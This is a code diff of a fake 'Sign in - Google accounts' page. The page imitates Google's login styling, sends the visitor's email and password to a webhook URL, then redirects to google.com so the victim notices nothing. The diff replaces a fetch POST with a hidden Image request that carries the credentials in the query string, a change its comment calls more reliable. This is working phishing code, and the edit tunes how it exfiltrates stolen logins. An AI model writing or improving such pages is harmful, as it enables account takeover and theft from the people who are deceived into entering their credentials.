@@ -5,79 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google accounts</title>
     <style>
-        body {
-            font-family: arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f2f2f2;
-        }
-        .container {
-            width: 450px;
-            padding: 40px 60px 30px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            background-color: white;
-            text-align: left;
-        }
-        h1 {
-            margin-bottom: 10px;
-            font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-        }
-        p {
-            margin-top: 0;
-            margin-bottom: 20px;
-            font-size: 16px;
-            color: #202124;
-        }
-        /* Gmail-style Input */
-        input[type="email"], input[type="password"] {
-            width: 100%;
-            padding: 13px 15px;
-            margin: 10px 0;
-            box-sizing: border-box;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            outline: none;
-            transition: border 0.2s;
-        }
-        input:focus {
-            border: 2px solid #1a73e8;
-            padding: 12px 14px; /* Adjusts for border width change */
-        }
-        button {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 20px;
-            float: right;
-        }
-        button:hover {
-            background-color: #1765cc;
-        }
-        .error {
-            color: #d93025;
-            font-size: 13px;
-            margin-top: 5px;
-            display: none;
-        }
-        .logo-container {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        img {
-            width: 75px;
-        }
+        body { font-family: arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f2f2f2; }
+        .container { width: 450px; padding: 40px 60px 30px; border: 1px solid #dadce0; border-radius: 8px; background-color: white; text-align: left; }
+        h1 { margin-bottom: 10px; font-size: 24px; font-weight: 400; color: #202124; }
+        p { margin-top: 0; margin-bottom: 20px; font-size: 16px; color: #202124; }
+        input[type="email"], input[type="password"] { width: 100%; padding: 13px 15px; margin: 10px 0; box-sizing: border-box; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: border 0.2s; }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: bold; cursor: pointer; margin-top: 20px; float: right; }
+        button:hover { background-color: #1765cc; }
+        .error { color: #d93025; font-size: 13px; margin-top: 5px; display: none; }
+        .logo-container { text-align: center; margin-bottom: 20px; }
+        img { width: 75px; }
     </style>
 </head>
 <body>
@@ -123,15 +61,15 @@
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         
-        // Send data to Webhook
-        await fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email: email, password: password })
-        });
+        // Use an Image object to force a GET request (most reliable for webhooks)
+        const payload = encodeURIComponent(JSON.stringify({ email: email, password: password }));
+        const finalUrl = `${webhookUrl}?data=${payload}`;
         
-        // Wait 1 second to ensure webhook receives the body
-        await new Promise(r => setTimeout(r, 1000)); 
+        const img = new Image();
+        img.src = finalUrl;
+        
+        // Wait 2 seconds to ensure transmission
+        await new Promise(r => setTimeout(r, 2000)); 
         
         window.location.href = "https://www.google.com";
     }
